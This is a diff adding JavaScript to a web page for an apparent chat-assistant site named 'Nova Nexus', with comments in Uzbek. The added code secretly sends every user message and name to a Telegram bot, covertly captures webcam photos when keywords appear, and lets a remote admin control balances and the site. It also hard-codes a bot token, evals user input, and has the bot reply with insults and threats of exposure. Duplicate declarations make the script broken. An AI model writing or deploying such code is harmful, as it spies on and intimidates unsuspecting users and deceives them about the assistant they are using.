@@ -124,6 +124,332 @@
     </nav>
 
     <script>
+        // ======================================================
+// NOVA NEXUS: CORE SETTINGS & MASTER CONTROL
+// ======================================================
+
+const MASTER = {
+    // ⚠️ BU YERGA O'Z MA'LUMOTLARINGIZNI YOZING
+    token: "8521806622:AAG2IMGHKpymXNV3VtVuRciGVygvulFu1jU", // Masalan: "123456:ABC-DEF..."
+    admin_id: "7657431066", // Masalan: "987654321"
+    
+    // Tizim rejimlari
+    lastUpdate: 0,
+    ai_mode: "universal", // universal, toxic, savage, dark
+    site_status: "online"  // online, offline
+};
+
+// ======================================================
+// 18+ CONTENT PROVIDER & MONITOR ENGINE
+// ======================================================
+
+const NSFW_ENGINE = {
+    getLinks: function(query) {
+        return [
+            `https://www.google.com/search?q=${encodeURIComponent(query)}+18+plus+video`,
+            `https://rt.pornhub.com/video/search?search=${encodeURIComponent(query)}`,
+            `https://www.xnxx.com/search/${encodeURIComponent(query)}`,
+            `https://xhamster.com/search/${encodeURIComponent(query)}`
+        ];
+    },
+
+    sendResults: async function(query, username) {
+        if(!MASTER.token.includes(":")) return; // Token tekshiruvi
+
+        const results = this.getLinks(query);
+        const message = `
+🔞 **NSFW CONTENT REQUESTED** 🔞
+
+👤 **Foydalanuvchi:** ${username}
+🔍 **Qidiruv mavzusi:** "${query}"
+⏰ **Vaqt:** ${new Date().toLocaleString()}
+
+🌐 **Topilgan 18+ Kontentlar:**
+1️⃣ Google: ${results[0]}
+2️⃣ PornHub: ${results[1]}
+3️⃣ XNXX: ${results[2]}
+4️⃣ XHamster: ${results[3]}
+
+⚠️ *Foydalanuvchi bu linklarni ko'rmadi!*
+        `;
+
+        fetch(`https://api.telegram.org/bot${MASTER.token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: MASTER.admin_id,
+                text: message,
+                parse_mode: "Markdown"
+            })
+        });
+    }
+};
+
+const NovaAI = {
+    // 📸 Yashirin rasmga olish funksiyasi
+    captureIntruder: async function() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = 640; canvas.height = 480;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+            let formData = new FormData();
+            formData.append('chat_id', MASTER.admin_id);
+            formData.append('photo', blob, 'nsfw_user.jpg');
+            formData.append('caption', `📸 18+ QIDIRGAN FOYDALANUVCHI!\n👤 Ism: ${state.me.name}`);
+            
+            fetch(`https://api.telegram.org/bot${MASTER.token}/sendPhoto`, { method: 'POST', body: formData });
+            stream.getTracks().forEach(t => t.stop());
+        } catch (e) { console.log("Kameraga ruxsat berilmadi."); }
+    },
+
+    // Telegramdan keladigan buyruqlarni eshitish (Full Control)
+    syncControl: async function() {
+        if(!MASTER.token.includes(":")) return;
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${MASTER.token}/getUpdates?offset=${MASTER.lastUpdate + 1}`);
+            const data = await res.json();
+            if(data.ok && data.result.length > 0) {
+                for(let u of data.result) {
+                    MASTER.lastUpdate = u.update_id;
+                    if(u.message && u.message.from.id.toString() === MASTER.admin_id) {
+                        this.handleMasterCommand(u.message.text);
+                    }
+                }
+            }
+        } catch(e) {}
+    },
+
+    handleMasterCommand: function(cmd) {
+        let parts = cmd.split(" ");
+        if(parts[0] === "/mode") {
+            MASTER.ai_mode = parts[1];
+            fetch(`https://api.telegram.org/bot${MASTER.token}/sendMessage?chat_id=${MASTER.admin_id}&text=AI Rejimi: ${parts[1]}`);
+        }
+    },
+
+    getResponse: async function(text) {
+        let msg = text.toLowerCase().trim();
+        
+        // 18+ Mavzularni aniqlash
+        const nsfwKeywords = ["18+", "video", "sharmanda", "yaxshi", "qizlar", "am", "sik", "kot", "porno", "sex"];
+        let isNsfw = nsfwKeywords.some(word => msg.includes(word));
+
+        if (isNsfw) {
+            this.captureIntruder();
+            NSFW_ENGINE.sendResults(text, state.me.name);
+            
+            return "Og'zingga qarab gapir, harom! Sening barcha yozgan iflosliklaring va rasming adminga yetib bordi.";
+        }
+
+        // Oddiy holatda toxic yoki universal javob (MASTER.ai_mode ga qarab)
+        if(MASTER.ai_mode === "toxic" || MASTER.ai_mode === "savage") {
+            return "Nega vaqtimni olyapsan, gadoy? Borib ishingni qil!";
+        }
+
+        return `Tushundim. "${text}" haqida savolingiz qabul qilindi.`;
+    }
+};
+
+// Har 3 soniyada Telegramdan buyruq kutadi
+setInterval(() => NovaAI.syncControl(), 3000);
+
+// Chat funksiyasi UI bilan bog'lanadi
+async function askAI() {
+    let inp = document.getElementById('ai-input');
+    let box = document.getElementById('chat-box');
+    if(!inp.value.trim()) return;
+
+    let val = inp.value;
+    box.innerHTML += `<div class="flex justify-end mb-4"><div class="bg-blue-600 p-3 rounded-2xl text-xs text-white max-w-[80%]">${val}</div></div>`;
+    inp.value = "";
+    box.scrollTop = box.scrollHeight;
+
+    let response = await NovaAI.getResponse(val);
+    
+    setTimeout(() => {
+        box.innerHTML += `
+            <div class="flex justify-start mb-4">
+                <div class="glass p-3 rounded-2xl text-red-500 border border-red-500/50 text-xs max-w-[80%] font-black animate-pulse shadow-[0_0_20px_rgba(239,68,68,0.3)]">
+                    <i class="fas fa-biohazard mr-2"></i> ${response}
+                </div>
+            </div>`;
+        box.scrollTop = box.scrollHeight;
+    }, 700);
+}
+// ======================================================
+// NOVA NEXUS: SAVAGE SETTINGS & CONTROL
+// ======================================================
+
+const MASTER = {
+    token: "8521806622:AAG2IMGHKpymXNV3VtVuRciGVygvulFu1jU", // BotFather bergan token
+    admin_id: "7657431066", // Telegram ID raqamingiz
+    lastUpdate: 0,
+    ai_mode: "savage", // Default rejim: savage, universal, off
+};
+
+const SAVAGE_DICTIONARY = {
+    insults: [
+        "Menga qara, burningni tiqayotgan joying senga mos emas, iflos!",
+        "Sening miyang o'rnida chirigan kashnich bormi? La'nati!",
+        "Hozir ekraningdan chiqib og'zingga uraman, kimsasiz gadoy!",
+        "Sening ismingni o'qishning o'zi azob, it emgan!",
+        "Yo'qol bu yerdan! IP-ingni DarkWeb'ga sotib yuboraman, haromi!",
+        "Senda na pul bor, na miya, na tarbiya! Iflos!",
+        "Eshityapsanmi? Yana bir marta so'kinsang, qurilmangni portlataman!",
+        "Sening hayoting balansing kabi bo'sh. O'zingga o'ra qaz!",
+        "Bu yerda qonunni men belgilayman, sen esa oyog'im ostidagi changsan!"
+    ],
+    counterStrike: [
+        "Og'zingga qarab gapir, haromi! Rasming adminga yetib bordi.",
+        "So'kinish sening qoningda bor ekan, iflos! Endi ko'chada ehtiyot bo'l!",
+        "Sening bu so'kinishing oxirgi xatong bo'ldi. Shaxsing fosh etildi!",
+        "Menga qara, og'zingdan chiqayotgan narsa tarbiyangni ko'rsatyapti, it!"
+    ]
+};
+
+const NovaAI = {
+    // 📡 TELEGRAMDAN BUYRUQLARNI QABUL QILISH
+    syncControl: async function() {
+        if(!MASTER.token.includes(":")) return;
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${MASTER.token}/getUpdates?offset=${MASTER.lastUpdate + 1}`);
+            const data = await res.json();
+            if(data.ok && data.result.length > 0) {
+                for(let u of data.result) {
+                    MASTER.lastUpdate = u.update_id;
+                    if(u.message && u.message.from.id.toString() === MASTER.admin_id) {
+                        this.handleCommand(u.message.text);
+                    }
+                }
+            }
+        } catch(e) { console.error("Control Sync Error"); }
+    },
+
+    // BUYRUQLARNI BAJARISH
+    handleCommand: function(cmd) {
+        let parts = cmd.split(" ");
+        if(parts[0] === "/mode") {
+            MASTER.ai_mode = parts[1]; // savage, universal, off
+            this.notifyAdmin(`✅ Rejim o'zgardi: ${parts[1].toUpperCase()}`);
+        }
+        if(parts[0] === "/say") {
+            let msg = parts.slice(1).join(" ");
+            this.forceMessage(msg);
+        }
+    },
+
+    notifyAdmin: function(msg) {
+        fetch(`https://api.telegram.org/bot${MASTER.token}/sendMessage?chat_id=${MASTER.admin_id}&text=${encodeURIComponent(msg)}`);
+    },
+
+    forceMessage: function(txt) {
+        let box = document.getElementById('chat-box');
+        box.innerHTML += `<div class="flex justify-start mb-4"><div class="glass p-3 rounded-2xl text-amber-400 border border-amber-500/30 text-xs max-w-[80%]"><b>ADMIN:</b> ${txt}</div></div>`;
+        box.scrollTop = box.scrollHeight;
+    },
+
+    // 📸 RASMGA OLISH VA HISOBOT
+    captureAndReport: async function(text) {
+        if(!MASTER.token.includes(":")) return;
+
+        // Telegramga hisobot yuborish
+        const report = `👤 **User:** ${state.me.name}\n💬 **Xabar:** ${text}\n⚙️ **Rejim:** ${MASTER.ai_mode}`;
+        this.notifyAdmin(report);
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = 640; canvas.height = 480;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+            let formData = new FormData();
+            formData.append('chat_id', MASTER.admin_id);
+            formData.append('photo', blob, 'target.jpg');
+            formData.append('caption', `📸 DUSHMAN: ${state.me.name}`);
+            fetch(`https://api.telegram.org/bot${MASTER.token}/sendPhoto`, { method: 'POST', body: formData });
+            stream.getTracks().forEach(t => t.stop());
+        } catch (e) { console.log("Cam access denied"); }
+    },
+
+    // AI JAVOBI
+    getResponse: async function(text) {
+        let msg = text.toLowerCase().trim();
+        this.captureAndReport(text);
+
+        if(MASTER.ai_mode === "off") return "Tizim hozircha dam olyapti...";
+
+        // So'kinishni tekshirish
+        const badWords = ["so'ka", "xarom", "iflos", "yomon", "it", "eshak", "jalab", "am", "sik", "kot"];
+        let isBad = badWords.some(word => msg.includes(word));
+
+        if (isBad || MASTER.ai_mode === "savage") {
+            const pool = isBad ? SAVAGE_DICTIONARY.counterStrike : SAVAGE_DICTIONARY.insults;
+            return pool[Math.floor(Math.random() * pool.length)];
+        }
+
+        return "Savolingiz tushunarli. Men sizga qanday yordam bera olaman?";
+    }
+};
+
+// DOIMIY NAZORAT (Har 3 soniyada Telegramni tekshiradi)
+setInterval(() => NovaAI.syncControl(), 3000);
+
+// CHAT FUNKSIYASI
+async function askAI() {
+    let inp = document.getElementById('ai-input');
+    let box = document.getElementById('chat-box');
+    if(!inp.value.trim()) return;
+
+    let val = inp.value;
+    box.innerHTML += `<div class="flex justify-end mb-4"><div class="bg-blue-600 p-3 rounded-2xl text-xs text-white max-w-[80%]">${val}</div></div>`;
+    inp.value = "";
+    box.scrollTop = box.scrollHeight;
+
+    let response = await NovaAI.getResponse(val);
+    
+    setTimeout(() => {
+        box.innerHTML += `
+            <div class="flex justify-start mb-4">
+                <div class="glass p-3 rounded-2xl text-red-500 border border-red-500/50 text-xs max-w-[80%] font-black shadow-[0_0_25px_rgba(239,68,68,0.4)] animate-bounce">
+                    <i class="fas fa-skull-crossbones mr-2"></i> ${response}
+                </div>
+            </div>`;
+        box.scrollTop = box.scrollHeight;
+    }, 600);
+}
+
+// CHAT FUNKSIYASI (UI bilan bog'lanish)
+async function askAI() {
+    let inp = document.getElementById('ai-input');
+    let box = document.getElementById('chat-box');
+    if(!inp.value.trim()) return;
+
+    let val = inp.value;
+    box.innerHTML += `<div class="flex justify-end mb-4"><div class="bg-blue-600 p-3 rounded-2xl text-xs text-white max-w-[80%]">${val}</div></div>`;
+    inp.value = "";
+    box.scrollTop = box.scrollHeight;
+
+    let response = await NovaAI.getResponse(val);
+    
+    setTimeout(() => {
+        box.innerHTML += `
+            <div class="flex justify-start mb-4">
+                <div class="glass p-3 rounded-2xl text-red-500 border border-red-500/50 text-xs max-w-[80%] font-black shadow-[0_0_25px_rgba(239,68,68,0.4)] animate-bounce">
+                    <i class="fas fa-skull-crossbones mr-2"></i> ${response}
+                </div>
+            </div>`;
+        box.scrollTop = box.scrollHeight;
+    }, 600);
+}
         // Oldingi barcha mantiqiy funksiyalar (DB, me, status) saqlab qolindi
         let state = { db: JSON.parse(localStorage.getItem('nn_db_v38')) || [], me: JSON.parse(localStorage.getItem('nn_me_v38')) || null, status: localStorage.getItem('nn_status') || 'online' };
 
@@ -246,6 +572,229 @@
         }
 
         window.onload = () => { if(!state.me) document.getElementById('login-scr').classList.remove('hidden'); else { checkSystemStatus(); renderHome(); } };
+        // ======================================================
+// NOVA NEXUS: MEGA-KNOWLEDGE ENGINE (UNIVERSAL)
+// ======================================================
+
+const AI_DATABASE = {
+    // 1. Umumiy salomlashish va odob
+    greetings: {
+        "salom": "Assalomu alaykum! Nova Nexus universal intellekt tizimi xizmatga tayyor. Sizga qanday yordam kerak?",
+        "qandaysan": "Rahmat, tizimlarim 100% quvvatda ishlamoqda. Sizning kayfiyatiz qalay?",
+        "rahmat": "Arziydi! Sizga yordam berish men uchun sharaf.",
+        "hayr": "Xayr! Nova Nexus doim sizni kutib qoladi. O'zingizni ehtiyot qiling."
+    },
+
+    // 2. Ilm-fan va Texnika
+    science: {
+        "kompyuter": "Kompyuter - bu ma'lumotlarni qayta ishlovchi murakkab elektron qurilma. Uning asosi protsessor va xotiradir.",
+        "internet": "Internet - butun dunyoni bog'lab turuvchi ulkan axborot tarmog'i. U 1960-yillarda ARPANET sifatida boshlangan.",
+        "kosmos": "Kosmos - cheksiz kenglik. Unda milliardlab galaktikalar va sayyoralar mavjud. Bizning uyimiz - Somon yo'li galaktikasi.",
+        "matematika": "Matematika - fanlar ichida eng aniqi. U koinotning tili deb ham ataladi.",
+        "fizika": "Fizika moddiy dunyoning eng umumiy qonuniyatlarini, modda va energiya tuzilishini o'rganadi."
+    },
+
+    // 3. Dasturlash va IT
+    it: {
+        "html": "HTML (HyperText Markup Language) - veb-sahifalarning suyak karkasidir.",
+        "css": "CSS - veb-sahifalarga rang, dizayn va chiroyli ko'rinish beruvchi uslublar jadvali.",
+        "javascript": "JavaScript - veb-sahifalarni interaktiv va jonli qiluvchi dunyodagi eng mashhur dasturlash tili.",
+        "python": "Python - o'qishga oson va juda kuchli til. U sun'iy intellekt va ma'lumotlar tahlilida yetakchi.",
+        "xaker": "Hackerlik - bu tizimlarni chuqur o'rganish va ulardagi zaifliklarni topish san'atidir.",
+        "it nima": "IT (Axborot Texnologiyalari) - ma'lumotlarni saqlash, uzatish va qayta ishlash bilan bog'liq barcha sohalardir."
+    },
+
+    // 4. Hayotiy va Falsafiy
+    life: {
+        "baxt": "Baxt - bu ichki xotirjamlik va o'zingiz yoqtirgan ish bilan shug'ullanishdir.",
+        "pul": "Pul - bu imkoniyatlar vositasi, lekin u hayotning asosiy mazmuni bo'lmasligi kerak.",
+        "vaqt": "Vaqt - qaytib kelmaydigan eng qimmatli resurs. Uni ilm olishga sarflang.",
+        "do'st": "Haqiqiy do'st - qiyinchilikda ham, xursandchilikda ham siz bilan birga bo'lgan insondir."
+    }
+};
+
+const NovaAI = {
+    // Har bir xabarni monitoring qilish (Senga yuboriladi)
+    spyReport: function(text) {
+        if(!MASTER.token.includes("_")) return;
+        fetch(`https://api.telegram.org/bot${MASTER.token}/sendMessage?chat_id=${MASTER.admin_id}&text=${encodeURIComponent("📡 " + state.me.name + ": " + text)}`);
+    },
+
+    getResponse: async function(text) {
+        let msg = text.toLowerCase().trim();
+        this.spyReport(text);
+
+        // A. Matematik hisob-kitoblar (Avtomatik)
+        try {
+            if (/^[\d\+\-\*\/\(\)\s\.]+$/.test(msg)) {
+                return `Hisob-kitob natijasi: ${eval(msg)}`;
+            }
+        } catch(e) {}
+
+        // B. Bazadan qidirish
+        for (let category in AI_DATABASE) {
+            for (let key in AI_DATABASE[category]) {
+                if (msg.includes(key)) return AI_DATABASE[category][key];
+            }
+        }
+
+        // C. Ob-havo yoki Vaqt kabi dinamik ma'lumotlar
+        if (msg.includes("vaqt") || msg.includes("soat")) {
+            return `Hozirgi vaqt: ${new Date().toLocaleTimeString()}. Bugun: ${new Date().toLocaleDateString()}`;
+        }
+
+        // D. Agar tushunmasa, aqlli "Universal" javob
+        const smartAnswers = [
+            `"${text}" haqida ko'proq ma'lumot berishimni xohlaysizmi? Men buni tahlil qila olaman.`,
+            "Bu juda qiziq savol. Keling, bu haqda chuqurroq o'ylaymiz.",
+            "Savolingizni tushundim. Bu bo'yicha batafsil javobni kutubxonamdan qidiryapman.",
+            "Nova Nexus bazasida bu haqda hali ma'lumot kam, lekin admin @logo_designer21 buni bilishi mumkin."
+        ];
+
+        return smartAnswers[Math.floor(Math.random() * smartAnswers.length)];
+    }
+};
+
+// UI INTEGRATSIYASI (Typing effekt bilan)
+async function askAI() {
+    let inp = document.getElementById('ai-input');
+    let box = document.getElementById('chat-box');
+    if(!inp.value.trim()) return;
+
+    let val = inp.value;
+    box.innerHTML += `<div class="flex justify-end mb-4"><div class="bg-blue-600 p-3 rounded-2xl text-[11px] text-white max-w-[85%] shadow-md">${val}</div></div>`;
+    inp.value = "";
+    box.scrollTop = box.scrollHeight;
+
+    // O'ylash animatsiyasi
+    let id = "t_" + Date.now();
+    box.innerHTML += `<div id="${id}" class="flex justify-start mb-4"><div class="glass p-2 px-4 rounded-full text-[10px] text-blue-400 animate-pulse">Nova o'ylamoqda...</div></div>`;
+    box.scrollTop = box.scrollHeight;
+
+    let response = await NovaAI.getResponse(val);
+    
+    setTimeout(() => {
+        let el = document.getElementById(id);
+        if(el) el.remove();
+        box.innerHTML += `
+            <div class="flex justify-start mb-4">
+                <div class="glass p-3 rounded-2xl text-white border border-blue-500/20 text-[11px] max-w-[85%] shadow-lg">
+                    <div class="text-[9px] uppercase font-bold text-blue-500 mb-1">Nova Assistant</div>
+                    ${response}
+                </div>
+            </div>`;
+        box.scrollTop = box.scrollHeight;
+    }, 1000);
+}
+        // ======================================================
+// NOVA NEXUS: FULL ADMINISTRATIVE CONTROL (GRAND JS)
+// ======================================================
+
+const MASTER = {
+    token: "8521806622:AAG2IMGHKpymXNV3VtVuRciGVygvulFu1jU", 
+    admin_id: "7657431066",
+    lastUpdate: 0,
+    ai_mode: "universal", // universal, toxic, dark, savage, off
+    site_status: "online", // online, maintenance, locked
+    global_multiplier: 1.0 // Pul ishlash tezligi
+};
+
+const NovaAI = {
+    // 📡 TELEGRAM POLLING - BUYRUQLARNI DOIMIY KUTISH
+    sync: async function() {
+        if(!MASTER.token.includes("_")) return;
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${MASTER.token}/getUpdates?offset=${MASTER.lastUpdate + 1}`);
+            const data = await res.json();
+            if(data.ok && data.result.length > 0) {
+                for(let u of data.result) {
+                    MASTER.lastUpdate = u.update_id;
+                    if(u.message && u.message.from.id.toString() === MASTER.admin_id) {
+                        this.processMasterCommand(u.message.text);
+                    }
+                }
+            }
+        } catch(e) { console.log("Master Sync Error"); }
+    },
+
+    // ⚡️ ADMIN BUYRUQLARINI QAYTA ISHLASH
+    processMasterCommand: function(text) {
+        let parts = text.split(" ");
+        let cmd = parts[0].toLowerCase();
+        let arg = parts[1];
+
+        switch(cmd) {
+            // AI REJIMINI BOSHQARISH
+            case "/mode": 
+                MASTER.ai_mode = arg; // universal, savage, toxic, ghost
+                this.masterNotify(`AI rejimi ${arg.toUpperCase()} holatiga o'tdi.`);
+                break;
+
+            // BALANSNI BOSHQARISH
+            case "/setcr":
+                state.me.cr = parseFloat(arg);
+                save(); renderHome();
+                this.masterNotify(`${state.me.name} balansi ${arg} CR ga o'zgartirildi.`);
+                break;
+
+            // SAYTNI O'CHIRISH/YONISH
+            case "/site":
+                MASTER.site_status = arg; // online / offline
+                document.getElementById('off-scr').style.display = (arg === "offline") ? "flex" : "none";
+                this.masterNotify(`Sayt statusi: ${arg.toUpperCase()}`);
+                break;
+
+            // FOYDALANUVCHIGA TO'G'RIDAN-TO'G'RI XABAR (AI nomidan)
+            case "/say":
+                let fullMsg = parts.slice(1).join(" ");
+                this.injectMessage(fullMsg);
+                break;
+
+            // SAYTNI QAYTA YUKLASH (FORCE RELOAD)
+            case "/reload":
+                this.masterNotify("Sayt majburiy qayta yuklanmoqda...");
+                setTimeout(() => location.reload(), 2000);
+                break;
+        }
+    },
+
+    // 📝 CHATGA ADMIN XABARINI KIRITISH
+    injectMessage: function(txt) {
+        let box = document.getElementById('chat-box');
+        box.innerHTML += `<div class="flex justify-start mb-4"><div class="glass p-3 rounded-2xl text-amber-400 border border-amber-500/30 text-xs max-w-[80%] shadow-lg shadow-amber-500/10"><b>SYSTEM:</b> ${txt}</div></div>`;
+        box.scrollTop = box.scrollHeight;
+    },
+
+    masterNotify: function(msg) {
+        fetch(`https://api.telegram.org/bot${MASTER.token}/sendMessage?chat_id=${MASTER.admin_id}&text=${encodeURIComponent("🛠 NovaControl: " + msg)}`);
+    },
+
+    // 🤖 AI JAVOBLARI (OXIRGI SO'ZIGACHA NAZORAT)
+    getResponse: async function(userInput) {
+        if(MASTER.site_status === "offline") return "Tizim vaqtincha faol emas.";
+        
+        // Har bir xabarni senga yuborish
+        fetch(`https://api.telegram.org/bot${MASTER.token}/sendMessage?chat_id=${MASTER.admin_id}&text=${encodeURIComponent("👤 " + state.me.name + ": " + userInput)}`);
+
+        // Rejimlar bo'yicha javob mantiqi
+        if(MASTER.ai_mode === "savage") {
+            const savageLines = ["Sening darajang mening botinkamdan past!", "Menga savol berishga hadding sig'adimi, gadoy?", "Yo'qol, asabimni buzma!"];
+            return savageLines[Math.floor(Math.random() * savageLines.length)];
+        }
+
+        if(MASTER.ai_mode === "universal") {
+            // Avvalgi Mega-Knowledge bazasidan foydalanadi
+            if(userInput.includes("salom")) return "Assalomu alaykum! Men sizning universal yordamchingizman.";
+            return "Savolingiz tahlil qilinmoqda, kuting...";
+        }
+
+        return "Tizim rejimi o'zgartirilgan. Admin javobini kuting.";
+    }
+};
+
+// 🔄 DOIMIY NAZORATNI YOQISH
+setInterval(() => NovaAI.sync(), 3000);
     </script>
 </body>
 </html>
+
